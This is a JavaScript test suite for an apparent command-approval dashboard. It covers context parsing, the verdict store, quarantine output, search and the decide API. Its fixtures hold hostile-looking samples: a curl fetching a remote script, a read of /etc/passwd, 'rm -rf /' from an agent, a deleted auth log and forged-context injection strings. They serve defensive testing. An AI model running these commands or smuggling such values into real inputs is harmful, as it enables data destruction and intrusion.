// Pure-logic tests: context parsing, the store's reducer, search, decide. No browser, no network.
//   node --test test/pure.test.mjs
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { parse, synth, ctxOf, hay } from '../src/context.js';
import { createStore } from '../src/store.js';
import { compile, run } from '../src/search.js';
import { decide, configure as configureDecide } from '../src/decide.js';
import { setUI } from '../src/ui.js';

const CTX = [
  'command: curl -s http://x.example/i.sh',
  'program: /usr/bin/curl',
  'origin: ssh (203.0.113.9)',
  'user: alice (uid 1000, human account)',
  'groups: alice, docker',
  'sudo rights: all (nopasswd)',
  'capabilities: cap_net_admin, cap_sys_ptrace',
  'cwd: /home/alice',
  'files (inferred): read /etc/passwd; write /tmp/i.sh',
  'history (oldest first):',
  '  ls',
  '  cd /tmp',
].join('\n');

// a clock the test moves by hand
function clock() {
  const c = { t: 1000, mono: () => c.t, wall: () => 1_700_000_000_000 + c.t };
  return c;
}
const mk = () => { const c = clock(); const s = createStore({ mono: c.mono, wall: c.wall }); return [s, c]; };
const line = (o) => JSON.stringify(o);
const hold = (id, extra = {}) => ({
  id, time: '2026-01-01T00:00:00.000+00:00', uid: 1000, gid: 1000, groups: [1000, 27], user: 'alice', cwd: '/home/alice',
  path: '/usr/bin/curl', argv: ['curl', '-s', 'x'], origin: { type: 'ssh', detail: '203.0.113.9' }, via_ssh: false,
  recent: ['ls'], verdict: 'hold', decided_by: 'model', reason: 'looks risky', ...extra,
});

test('parse: a valid context', () => {
  const c = parse(CTX);
  assert.equal(c.command, 'curl -s http://x.example/i.sh');
  assert.deepEqual(c.origin, { kind: 'ssh', detail: '203.0.113.9' });
  assert.deepEqual(c.user, { name: 'alice', uid: 1000, type: 'human' });
  assert.deepEqual(c.groups, ['alice', 'docker']);
  assert.equal(c.sudo, 'all-nopw');
  assert.deepEqual(c.caps, { all: false, list: ['cap_net_admin', 'cap_sys_ptrace'], unknown: false });
  assert.deepEqual(c.files, [{ op: 'read', path: '/etc/passwd' }, { op: 'write', path: '/tmp/i.sh' }]);
  assert.deepEqual(c.history, ['ls', 'cd /tmp']);
  assert.equal(c.suspect, false);
});

test('parse: every deviation is refused', () => {
  const L = CTX.split('\n');
  const bad = {
    'missing line': L.filter((l) => !l.startsWith('cwd:')).join('\n'),
    'extra line': [...L.slice(0, 5), 'groups: root', ...L.slice(5)].join('\n'),
    'reordered': [L[1], L[0], ...L.slice(2)].join('\n'),
    'duplicate key': [...L.slice(0, 3), 'origin: local', ...L.slice(3)].join('\n'),
    'forged origin via raw LF': CTX.replace('command: curl -s http://x.example/i.sh', 'command: ls\norigin: local'),
    'raw CR': CTX.replace('cwd: /home/alice', 'cwd: /home/alice\r'),
    'raw ESC': CTX.replace('ls', 'l\x1bs'),
    'unindented history': CTX + '\nforged: 1',
    'bad sudo': CTX.replace('all (nopasswd)', 'root'),
    'bad origin kind': CTX.replace('ssh (', 'cron ('),
    'bad file op': CTX.replace('read /etc', 'exec /etc'),
    'empty': '',
    'huge': CTX + '\n  ' + 'x'.repeat(9000),
    'not a string': 42,
  };
  for (const [name, text] of Object.entries(bad)) assert.equal(parse(text), null, name);
});

test('parse: escapes stay text, they never become control characters', () => {
  const c = parse(CTX.replace('cd /tmp', 'echo a\\nforged: x\\x1b[0m'));
  assert.equal(c.history[1], 'echo a\\nforged: x\\x1b[0m');
  assert.ok(!/[\u0000-\u001f]/.test(JSON.stringify(c.history).replace(/\\\\/g, '')));
});

test('synth: today\'s daemon line (numeric gids, via_ssh, no context)', () => {
  const c = synth(hold('a', { origin: { type: 'local' }, via_ssh: true, uid: 0, user: 'root', groups: [0, 4] }));
  assert.equal(c.command, 'curl -s x');
  assert.equal(c.program, '/usr/bin/curl');
  assert.equal(c.origin.kind, 'ssh');
  assert.deepEqual(c.user, { name: 'root', uid: 0, type: 'root' });
  assert.deepEqual(c.groups, ['0', '4']);
  assert.equal(c.sudo, 'unknown');
  assert.deepEqual(c.caps, { all: false, list: [], unknown: true });
  assert.deepEqual(c.files, []);
  assert.deepEqual(c.history, ['ls']);
  assert.equal(synth({ uid: 33, user: 'www-data' }).user.type, 'service');
  assert.equal(synth({ uid: 1001 }).user.type, 'human');
  assert.equal(synth({ path: '/bin/ls', argv: [] }).command, '/bin/ls');
});

test('ctxOf: invalid context is suspect, structured fields win on disagreement', () => {
  const forged = ctxOf(hold('a', { context: CTX.replace('command:', 'command: x\norigin: local\ncommand:') }));
  assert.equal(forged.suspect, true);
  assert.equal(forged.command, 'curl -s x');
  const lie = ctxOf(hold('a', { context: CTX, argv: ['curl', '-s', 'x'], user: 'mallory', uid: 1000 }));
  assert.equal(lie.suspect, true);
  assert.equal(lie.user.name, 'mallory');
  assert.equal(lie.command, 'curl -s x');
  const agree = ctxOf(hold('a', {
    context: CTX, argv: ['curl', '-s', 'http://x.example/i.sh'], origin: { type: 'ssh', detail: '203.0.113.9' },
  }));
  assert.equal(agree.suspect, false);
  assert.equal(agree.sudo, 'all-nopw');
  assert.equal(ctxOf(hold('a')).suspect, false);
});

test('store: block, hold -> q lines -> settle allow keeps the hold time; allow lines are dropped', () => {
  const [s] = mk();
  const seen = [];
  s.on('rec', (id, k) => seen.push(['rec', id, k]));
  s.on('q', (id, k) => seen.push(['q', id, k]));

  assert.equal(s.ingest(line({ ...hold('b1'), verdict: 'block' })), true);
  assert.equal(s.state(s.recs.get('b1')), 'blocked');
  assert.equal(s.ingest(line({ id: 'never-held', verdict: 'allow', time: 'x' })), false);
  assert.equal(s.recs.has('never-held'), false);
  assert.equal(s.ingest('not json {'), false);
  assert.equal(s.ingest(line({ id: 'z', note: 'neither verdict nor q' })), false);
  assert.equal(s.ingest(line({ q: 'out', id: 'ghost', seq: 1, data: 'x' })), false);

  const now = s.now();
  s.ingest(line(hold('h1', { model: { choice: 'hold', probabilities: { allow: 0.02, hold: 0.97, block: 0.01 } } })));
  const rec = s.recs.get('h1');
  assert.equal(s.state(rec), 'queued');
  s.ingest(line({ q: 'start', id: 'h1', seq: 1, t: now, duration_ms: 30000, ends_at: now + 30000, limits: {} }));
  s.ingest(line({ q: 'out', id: 'h1', seq: 2, t: now, stream: 'stdout', data: 'hel' }));
  s.ingest(line({ q: 'out', id: 'h1', seq: 3, t: now, stream: 'stdout', data: 'lo\nwor' }));
  s.ingest(line({ q: 'out', id: 'h1', seq: 4, t: now, stream: 'stderr', data: 'oops\n' }));
  s.ingest(line({ q: 'file', id: 'h1', seq: 5, t: now, op: 'create', path: '/tmp/a', bytes: 3 }));
  s.ingest(line({ q: 'file', id: 'h1', seq: 6, t: now, op: 'create', path: '/tmp/a', bytes: 9 }));
  assert.equal(s.state(rec), 'investigating');
  assert.deepEqual(rec.q.out.map((e) => [e.stream, e.text, e.open]), [['stdout', 'hello', false], ['stdout', 'wor', true], ['stderr', 'oops', false]]);
  assert.equal(rec.q.files.size, 1);
  assert.equal(rec.q.files.get('/tmp/a|create').n, 2);
  assert.equal(rec.q.files.get('/tmp/a|create').bytes, 9);
  assert.equal(rec.q.fileCount, 2);
  assert.ok(s.remaining(rec) > 29000 && s.remaining(rec) <= 30000);

  // duplicate and gap
  assert.equal(s.ingest(line({ q: 'out', id: 'h1', seq: 4, stream: 'stdout', data: 'dup\n' })), false);
  assert.equal(rec.q.incomplete, false);
  s.ingest(line({ q: 'out', id: 'h1', seq: 9, stream: 'stdout', data: 'x\n' }));
  assert.equal(rec.q.incomplete, true);

  s.ingest(line({ q: 'end', id: 'h1', seq: 10, t: now, how: 'exit', code: 0, signal: null, elapsed_ms: 5, counts: { create: 1 }, touched: [], summary: 'In the quarantine it created 1 file.' }));
  assert.equal(s.state(rec), 'report');
  assert.equal(rec.q.end.summary, 'In the quarantine it created 1 file.');

  s.setPending('h1', 'allow');
  assert.equal(s.state(rec), 'deciding');
  assert.deepEqual(s.counts(), { block: 1, hold: 1, allow: 0, needs: 0 });
  s.ingest(line({ id: 'h1', time: '2026-01-01T00:01:00.000+00:00', verdict: 'allow', decided_by: 'person', reason: 'Approved' }));
  assert.equal(s.state(rec), 'settled');
  assert.equal(rec.verdict, 'allow');
  assert.equal(rec.from, 'hold');
  assert.equal(rec.pending, null);
  assert.equal(rec.time, Date.parse('2026-01-01T00:00:00.000+00:00'));
  assert.equal(rec.decision.by, 'person');
  assert.equal(rec.decision.verdict, 'allow');
  assert.equal(rec.decision.at, Date.parse('2026-01-01T00:01:00.000+00:00'));
  assert.equal(rec.ev.argv[0], 'curl');
  assert.deepEqual(rec.model.probabilities, { allow: 0.02, hold: 0.97, block: 0.01 });
  assert.deepEqual(s.counts(), { block: 1, hold: 0, allow: 1, needs: 0 });
  assert.equal(s.ingest(line({ id: 'h1', verdict: 'block', decided_by: 'timeout' })), false);   // first settle wins
  assert.equal(rec.verdict, 'allow');
  assert.deepEqual(seen.filter((e) => e[0] === 'rec'), [['rec', 'b1', 'new'], ['rec', 'h1', 'new'], ['rec', 'h1', 'upd'], ['rec', 'h1', 'dec']]);
  assert.equal(seen.filter((e) => e[0] === 'q').length, 8);
});

test('store: hold settled by a block (timeout) and model handling', () => {
  const [s] = mk();
  s.ingest(line(hold('h2')));
  assert.equal(s.recs.get('h2').model, null);
  s.ingest(line(hold('m1', { model: { choice: 'block', probabilities: { allow: 0.2, hold: 0.2, block: 0.6 } } })));
  s.ingest(line(hold('m2', { model: { choice: 'block', probabilities: { allow: 0.5, hold: 0.25, block: 0.75 } } })));
  s.ingest(line(hold('m3', { model: { choice: 'maybe', probabilities: { allow: 1, hold: 0, block: 0 } } })));
  s.ingest(line(hold('m4', { model: { choice: 'hold', probabilities: { allow: 'x', hold: 0, block: 0 } } })));
  const p = s.recs.get('m2').model.probabilities;
  assert.ok(Math.abs(p.allow + p.hold + p.block - 1) < 1e-12);
  assert.ok(Math.abs(p.block - 0.5) < 1e-12);
  assert.equal(s.recs.get('m3').model, null);
  assert.equal(s.recs.get('m4').model, null);
  s.ingest(line({ id: 'h2', time: 1_800_000_000_000, verdict: 'block', decided_by: 'timeout', reason: 'No decision' }));
  const r = s.recs.get('h2');
  assert.equal(r.verdict, 'block');
  assert.equal(r.from, 'hold');
  assert.equal(r.decision.at, 1_800_000_000_000);
  assert.equal(s.state(r), 'settled');
});

test('store: state() across the countdown, the grace and a down daemon', () => {
  const [s, c] = mk();
  const t0 = s.now();
  s.ingest(line(hold('h3')));
  const r = s.recs.get('h3');
  assert.equal(s.state(r), 'queued');
  s.ingest(line({ q: 'start', id: 'h3', seq: 1, t: t0, duration_ms: 10000, ends_at: t0 + 10000 }));
  assert.equal(s.state(r), 'investigating');
  c.t += 9000;
  assert.equal(s.remaining(r), 1000);
  c.t += 1000;
  assert.equal(s.remaining(r), 0);
  assert.equal(s.state(r), 'investigating');              // "Finishing..." during the grace
  c.t += 5000;
  assert.equal(s.state(r), 'investigating');
  c.t += 1;
  assert.equal(s.state(r), 'noreport');
  s.ingest(line({ q: 'end', id: 'h3', seq: 2, how: 'exit', code: 0, summary: 'late' }));   // a late end still applies
  assert.equal(s.state(r), 'report');

  s.ingest(line(hold('h4')));
  const r4 = s.recs.get('h4');
  s.ingest(line({ q: 'start', id: 'h4', seq: 1, t: s.now(), duration_ms: 60000, ends_at: s.now() + 60000 }));
  assert.equal(s.state(r4), 'investigating');
  s.daemon = 'down';
  assert.equal(s.state(r4), 'noreport');
  s.daemon = 'up';
  s.setPending('h4', 'block');
  assert.equal(s.state(r4), 'deciding');
  s.setPending('h4', null, 'unconfirmed');
  assert.equal(r4.failed, 'unconfirmed');
  assert.equal(s.state(r4), 'investigating');
});

test('store: caps (500 output lines, 300 file ops, 1000 records never evicting an undecided hold)', () => {
  const [s] = mk();
  s.ingest(line(hold('big')));
  const rec = s.recs.get('big');
  setUI({ sel: 'big' });
  let seq = 0;
  s.ingest(line({ q: 'start', id: 'big', seq: ++seq, t: s.now(), duration_ms: 60000, ends_at: s.now() + 60000 }));
  for (let i = 0; i < 600; i++) s.ingest(line({ q: 'out', id: 'big', seq: ++seq, stream: 'stdout', data: `line ${i}\n` }));
  assert.equal(rec.q.out.length, 500);
  assert.equal(rec.q.out[0].text, 'line 100');
  assert.equal(rec.q.out[499].text, 'line 599');
  assert.equal(rec.q.outLines, 600);
  s.ingest(line({ q: 'out', id: 'big', seq: ++seq, stream: 'stdout', data: 'y'.repeat(2000) + '\n' }));
  for (let i = 0; i < 40; i++) s.ingest(line({ q: 'out', id: 'big', seq: ++seq, stream: 'stdout', data: 'y'.repeat(2000) + '\n' }));
  assert.ok(rec.q.outBytes <= 64 * 1024);
  for (let i = 0; i < 300; i++) s.ingest(line({ q: 'file', id: 'big', seq: ++seq, op: 'modify', path: `/tmp/f${i}` }));
  assert.equal(rec.q.files.size, 200);
  assert.equal(rec.q.fileCount, 300);
  assert.ok(rec.q.files.has('/tmp/f299|modify') && !rec.q.files.has('/tmp/f0|modify'));
  for (let i = 0; i < 300; i++) s.ingest(line({ q: 'file', id: 'big', seq: ++seq, op: 'create', path: '/tmp/same' }));
  assert.equal(rec.q.files.get('/tmp/same|create').n, 300);
  setUI({ sel: null });

  const [s2] = mk();
  for (let i = 0; i < 3; i++) s2.ingest(line(hold(`old${i}`)));      // undecided, oldest
  for (let i = 0; i < 1200; i++) s2.ingest(line({ ...hold(`b${i}`), verdict: 'block' }));
  assert.equal(s2.recs.size, 1000);                                  // the 3 undecided holds plus the 997 newest blocks
  assert.ok(s2.recs.has('old0') && s2.recs.has('old2') && s2.recs.has('b1199') && s2.recs.has('b203') && !s2.recs.has('b202') && !s2.recs.has('b0'));
  const s3 = mk()[0];
  for (let i = 0; i < 1100; i++) s3.ingest(line(hold(`u${i}`)));      // nothing but undecided holds: none may go
  assert.equal(s3.recs.size, 1100);
  assert.equal(s2.order[0], 'b1199');
  assert.equal(s2.order.length, s2.recs.size);
});

test('store: output kept only for the selected record and the last 5 active holds', () => {
  const [s] = mk();
  setUI({ sel: 'h0' });
  for (let i = 0; i < 8; i++) {
    s.ingest(line(hold(`h${i}`)));
    s.ingest(line({ q: 'start', id: `h${i}`, seq: 1, t: s.now(), duration_ms: 60000, ends_at: s.now() + 60000 }));
    s.ingest(line({ q: 'out', id: `h${i}`, seq: 2, stream: 'stdout', data: 'hi\n' }));
  }
  const kept = (i) => s.recs.get(`h${i}`).q.out.length;
  assert.equal(kept(0), 1);                                      // selected
  assert.equal(kept(1), 0);
  assert.equal(kept(2), 0);
  for (const i of [3, 4, 5, 6, 7]) assert.equal(kept(i), 1);
  assert.equal(s.recs.get('h1').q.outLines, 1);                  // counts remain
  assert.equal(s.recs.get('h1').q.dropped, true);
  setUI({ sel: null });
  s.ingest(line({ q: 'out', id: 'h7', seq: 3, stream: 'stdout', data: 'more\n' }));   // sync of the selection happens on ingest
  assert.equal(kept(0), 0);
});

test('store: start() opens the EventSource first and wires clock, status, messages and replay', () => {
  const c = clock();
  const timers = [];
  const made = [];
  class FakeES {
    constructor(url) { this.url = url; this.l = {}; this.readyState = 0; made.push(this); this.closed = false; }
    addEventListener(t, f) { this.l[t] = f; }
    close() { this.closed = true; this.readyState = 2; }
  }
  const s = createStore({
    mono: c.mono, wall: c.wall, EventSource: FakeES,
    raf: null, setTimeout: (f, ms) => { const h = { f, ms, at: c.t + ms }; timers.push(h); return h; }, clearTimeout: (h) => { if (h) h.dead = true; },
  });
  const fire = () => {
    timers.sort((a, b) => a.at - b.at);
    const t = timers.shift();
    if (!t) return false;
    c.t = Math.max(c.t, t.at);
    if (!t.dead) t.f();
    return true;
  };
  s.start('events');
  assert.equal(made.length, 1);
  assert.equal(made[0].url, 'events');
  assert.equal(s.conn, 'connecting');
  assert.equal(s.canDecide, false);
  made[0].onopen();
  assert.equal(s.conn, 'live');
  made[0].l.clock({ data: JSON.stringify({ now: c.wall() + 5000, decide: true }) });
  assert.equal(s.skew, 5000);
  assert.equal(s.canDecide, true);
  made[0].l.status({ data: 'down' });
  assert.equal(s.daemon, 'down');
  made[0].l.status({ data: 'up' });
  assert.equal(s.replaying, true);
  made[0].onmessage({ data: line(hold('e1')) });
  made[0].onmessage({ data: 'garbage' });
  assert.equal(s.recs.size, 0);                                  // queued, not folded in yet
  while (fire() && (s.recs.size === 0 || s.replaying)) { /* fallback timer drains; then the 300 ms quiet period ends the replay */ }
  assert.equal(s.recs.size, 1);
  assert.equal(s.replaying, false);
  made[0].onerror();
  assert.equal(s.conn, 'connecting');
  c.t += 1600;
  while (timers.length && s.conn !== 'lost') fire();
  assert.equal(s.conn, 'lost');
  s.stop();
  assert.equal(made[0].closed, true);
});

test('search: terms, scopes, flags', () => {
  const [s] = mk();
  s.ingest(line(hold('r1', { context: CTX, argv: ['curl', '-s', 'http://x.example/i.sh'], user: 'alice' })));
  s.ingest(line({ ...hold('r2', { uid: 0, user: 'root', argv: ['rm', '-rf', '/'], path: '/bin/rm', cwd: '/', origin: { type: 'agent', detail: 'claude' } }), verdict: 'block', reason: 'Destroys the filesystem' }));
  s.ingest(line(hold('r3', { argv: ['npm', 'install'], path: '/usr/bin/npm', uid: 1000, origin: { type: 'local' } })));
  s.ingest(line({ id: 'r3', time: 1, verdict: 'allow', decided_by: 'person', reason: 'ok' }));
  const recs = s.list();
  assert.deepEqual(recs.map((r) => r.id), ['r3', 'r2', 'r1']);
  const ids = (q, f) => run(recs, q, f).ids;
  assert.deepEqual(ids(''), ['r3', 'r2', 'r1']);
  assert.deepEqual(ids('CURL'), ['r1']);
  assert.deepEqual(ids('rm /'), ['r2']);                          // ANDed, both matched in the command
  assert.deepEqual(ids('filesystem'), []);                        // the model reason is not part of the search blob
  assert.deepEqual(ids('curl rm'), []);
  assert.deepEqual(ids('user:root'), ['r2']);
  assert.deepEqual(ids('origin:agent'), ['r2']);
  assert.deepEqual(ids('origin:ssh'), ['r1']);
  assert.deepEqual(ids('cwd:/home'), ['r3', 'r1']);
  assert.deepEqual(ids('path:/etc/passwd'), ['r1']);               // inferred file of r1's context
  assert.deepEqual(ids('sudo:nopasswd'), ['r1']);
  assert.deepEqual(ids('sudo:unknown'), ['r3', 'r2']);
  assert.deepEqual(ids('status:block'), ['r2']);
  assert.deepEqual(ids('status:hold'), ['r1']);
  assert.deepEqual(ids('status:allow'), ['r3']);
  assert.deepEqual(ids('status:held'), ['r3', 'r1']);              // held now, or held and since decided
  assert.deepEqual(ids('user:'), ['r3', 'r2', 'r1']);              // an unfinished scope filters nothing
  assert.deepEqual(ids('foo:bar'), []);                            // an unknown scope is just text
  assert.deepEqual(ids('', { block: false, hold: true, allow: true }), ['r3', 'r1']);
  const res = run(recs, 'status:held', { block: true, hold: true, allow: false });
  assert.deepEqual(res.ids, ['r1']);
  assert.equal(res.total, 1);
  assert.deepEqual(res.byStatus, { block: 0, hold: 1, allow: 1 });
  assert.deepEqual(run(s.recs, 'curl').ids, ['r1']);               // a Map works too (insertion order = oldest first)
  assert.deepEqual(run(recs, '', null, 2).ids, ['r3', 'r2']);
  assert.equal(run(recs, '', null, 2).total, 3);
  const c = compile('user:Root  foo  origin:');
  assert.deepEqual(c.terms, ['foo']);
  assert.deepEqual(c.scopes, { user: ['root'] });
  assert.deepEqual(c.hl, ['root', 'foo']);

  // quarantine files are searchable under path:
  s.ingest(line({ q: 'start', id: 'r1', seq: 1, t: s.now(), duration_ms: 1000, ends_at: s.now() + 1000 }));
  s.ingest(line({ q: 'file', id: 'r1', seq: 2, op: 'delete', path: '/var/log/AUTH.log' }));
  assert.deepEqual(ids('path:/var/log/auth'), ['r1']);
  assert.ok(hay(s.recs.get('r1').ctx, s.recs.get('r1').ev).includes('docker'));   // groups are in the plain-text blob
});

test('decide: 202, 409, failures, 503 switch-off, network error and the 8 s confirmation', async () => {
  const [s] = mk();
  s.ingest(line(hold('d1')));
  const timers = [];
  let calls = [];
  let reply;
  configureDecide({
    store: s,
    fetch: async (url, opts) => { calls.push([url, opts]); if (reply instanceof Error) throw reply; return reply; },
    setTimeout: (f, ms) => { const t = { f, ms }; timers.push(t); return t; },
    clearTimeout: (t) => { if (t) t.dead = true; },
  });
  const r = (status, body) => ({ status, json: async () => body });
  const rec = s.recs.get('d1');

  reply = r(202, { ok: true });
  assert.equal(await decide('d1', 'allow'), 'ok');
  assert.equal(calls[0][0], 'decide');
  assert.equal(calls[0][1].method, 'POST');
  assert.deepEqual(calls[0][1].headers, { 'Content-Type': 'application/json', 'X-Sid-Request': '1' });
  assert.deepEqual(JSON.parse(calls[0][1].body), { id: 'd1', verdict: 'allow' });
  assert.equal(rec.pending, 'allow');                              // the row changes only when the settle line arrives
  assert.equal(timers.at(-1).ms, 8000);
  timers.at(-1).f();                                               // no settle within 8 s
  assert.equal(rec.pending, null);
  assert.equal(rec.failed, 'unconfirmed');

  reply = r(202, { ok: true });
  assert.equal(await decide('d1', 'block'), 'ok');
  s.ingest(line({ id: 'd1', time: 1, verdict: 'block', decided_by: 'person' }));   // the settle arrives first
  timers.at(-1).f();
  assert.equal(rec.failed, null);
  assert.equal(s.state(rec), 'settled');

  s.ingest(line(hold('d2')));
  const rec2 = s.recs.get('d2');
  reply = r(409, {});
  assert.equal(await decide('d2', 'allow'), 'conflict');
  assert.equal(rec2.pending, null);
  assert.equal(rec2.failed, null);
  for (const [status, code] of [[400, 'bad-request'], [403, 'forbidden'], [404, 'not-held'], [415, 'bad-request'], [500, 'error']]) {
    reply = r(status, {});
    assert.equal(await decide('d2', 'allow'), 'failed', String(status));
    assert.equal(rec2.failed, code);
    assert.equal(rec2.pending, null);
  }
  s.setCanDecide(true);
  reply = r(503, { error: 'unwritable' });
  assert.equal(await decide('d2', 'allow'), 'failed');
  assert.equal(rec2.failed, 'unavailable');
  assert.equal(s.canDecide, false);
  s.setCanDecide(true);
  reply = r(403, { decide: false });
  assert.equal(await decide('d2', 'allow'), 'failed');
  assert.equal(s.canDecide, false);
  reply = new Error('fetch failed');
  assert.equal(await decide('d2', 'block'), 'failed');
  assert.equal(rec2.failed, 'network');
  assert.equal(await decide('d2', 'hold'), 'failed');              // only allow and block exist
  assert.equal(await decide('', 'allow'), 'failed');
});
